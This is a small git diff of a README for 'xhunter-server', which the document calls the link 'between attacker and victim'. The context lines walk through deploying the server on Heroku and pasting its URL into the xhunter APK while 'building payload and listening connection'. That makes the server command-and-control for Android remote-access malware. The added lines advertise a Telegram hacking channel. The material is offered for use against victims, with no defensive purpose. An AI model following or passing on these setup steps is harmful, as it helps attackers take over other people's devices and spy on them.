@@ -12,3 +12,5 @@ xhunter-server is used to communicate between attacker and victim. It is very ea
  - Wait for the process to complete. 
  - Once complete, Click `view app` and If you see `Welcome to Xhunter Backend Server!!` then you have successfully created your server.
  - Now use this url `https://<your_app_name>.herokuapp.com` in [xhunter_v1.6.apk](https://github.com/anirudhmalik/xhunter/releases/tag/v1.6). during building payload and listening connection.
+JOIN TELEGRAM FOR MORE
+https://t.me/dangerhack56
